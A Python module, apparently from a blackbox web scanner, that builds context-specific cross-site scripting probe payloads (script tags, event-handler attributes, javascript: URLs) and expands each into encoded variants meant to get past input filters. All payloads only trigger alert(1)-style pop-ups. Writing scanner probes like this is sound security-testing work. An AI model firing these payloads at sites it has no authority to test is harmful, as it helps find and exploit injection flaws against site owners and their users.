"""
Encoding variants and context-aware XSS payload generation for blackbox scanner.

Provides generate_payloads(context=None) returning a list of payload strings
with URL-encoded, double-URL-encoded, HTML-entity-encoded, and Unicode-escaped variants.
"""

from typing import List, Optional
from urllib.parse import quote, quote_plus


# Context names for context-aware generation
CONTEXTS = (
    "html_body",
    "html_attribute",
    "js_string",
    "url",
    "comment",
)

# Base payloads per context (raw strings, suitable for that context)
_BASE_BY_CONTEXT: dict[str, List[str]] = {
    "html_body": [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
    ],
    "html_attribute": [
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        '" onmouseover="alert(1)" x="',
        "' onmouseover='alert(1)' x='",
        '" onfocus="alert(1)" autofocus x="',
        "onclick=alert(1) x=",
    ],
    "js_string": [
        "';alert(1);//",
        '";alert(1);//',
        "\\';alert(1);//",
        "'-alert(1)-'",
        '</script><script>alert(1)</script>',
    ],
    "url": [
        "javascript:alert(1)",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:alert(1)",
    ],
    "comment": [
        "--><script>alert(1)</script>",
        "-->' onfocus=alert(1) x='",
        "*/alert(1)/*",
    ],
}


def _url_encode(s: str) -> str:
    """Single URL encoding variant."""
    return quote(s, safe="")


def _double_url_encode(s: str) -> str:
    """Double URL-encoded variant (encode twice) for bypassing single-decode filters."""
    return quote(quote(s, safe=""), safe="")


def _html_entity_encode(s: str) -> str:
    """HTML entity-encoded variant (decimal entities for key chars)."""
    result = []
    for c in s:
        result.append(f"&#{ord(c)};" if ord(c) < 128 else c)
    return "".join(result)


def _unicode_escape_variant(s: str) -> str:
    """Unicode escape variant (\\uXXXX for ASCII letters)."""
    result = []
    for c in s:
        if "a" <= c <= "z" or "A" <= c <= "Z":
            result.append(f"\\u{ord(c):04x}")
        else:
            result.append(c)
    return "".join(result)


def _build_variants(base: str) -> List[str]:
    """Build encoding variants from a base payload."""
    variants = [base]
    variants.append(_url_encode(base))
    variants.append(_double_url_encode(base))
    variants.append(_html_entity_encode(base))
    variants.append(_unicode_escape_variant(base))
    return variants


def generate_payloads(context: Optional[str] = None) -> List[str]:
    """
    Generate XSS payload strings with encoding variants and optional context filtering.

    Args:
        context: One of 'html_body', 'html_attribute', 'js_string', 'url', 'comment',
                 or None for all contexts.

    Returns:
        List of payload strings (base + encoding variants).
    """
    if context is not None and context not in CONTEXTS:
        raise ValueError(f"Unknown context: {context}. Must be one of {CONTEXTS} or None.")

    bases: List[str] = []
    if context is None:
        for ctx_payloads in _BASE_BY_CONTEXT.values():
            bases.extend(ctx_payloads)
    else:
        bases.extend(_BASE_BY_CONTEXT.get(context, []))

    seen: set[str] = set()
    result: List[str] = []
    for base in bases:
        for v in _build_variants(base):
            if v not in seen:
                seen.add(v)
                result.append(v)
    return result
